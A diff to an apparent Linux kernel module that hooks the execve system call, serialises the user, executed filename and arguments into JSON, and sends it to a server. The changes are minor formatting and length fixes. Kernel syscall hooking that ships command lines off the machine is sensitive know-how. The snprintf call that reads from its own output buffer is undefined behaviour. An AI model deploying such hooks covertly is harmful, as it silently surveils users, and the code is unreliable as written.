@@ -55,7 +55,7 @@ static inline void set_json_buffer(
     }
 
     /* Close off the JSON buffer. */
-    snprintf(json_buffer, json_buffer_size, "%s\"}\n", json_buffer);
+    snprintf(json_buffer, json_buffer_size, "%s\"}\r\n", json_buffer);
 }
 
 /* execve system call hook via ptregs. */
@@ -72,7 +72,7 @@ asmlinkage int execve_hook(const struct pt_regs *regs)
 
     /* Original system call */
     sys_execve = (ptregs_syscall_hook_t)syscall_hook_get_original(__syscall_hook, __NR_execve);
-
+    
     /* User data */
     get_current_user_data(&c_user_data);
 
@@ -89,7 +89,7 @@ asmlinkage int execve_hook(const struct pt_regs *regs)
     }
 
     /* Clear the json buffer. */
-    memset(json_buffer, 0, json_buffer_size);
+    memset(json_buffer, '\0', json_buffer_size);
 
     /* Set the JSON buffer to be sent. */
     set_json_buffer(json_buffer, json_buffer_size,
@@ -97,7 +97,7 @@ asmlinkage int execve_hook(const struct pt_regs *regs)
             filename, argv);
 
     /* Send off the JSON buffer. */
-    server_send(json_buffer, json_buffer_size);
+    server_send(json_buffer, strlen(json_buffer));
 
     /* Free the JSON buffer. */
     vfree(json_buffer);
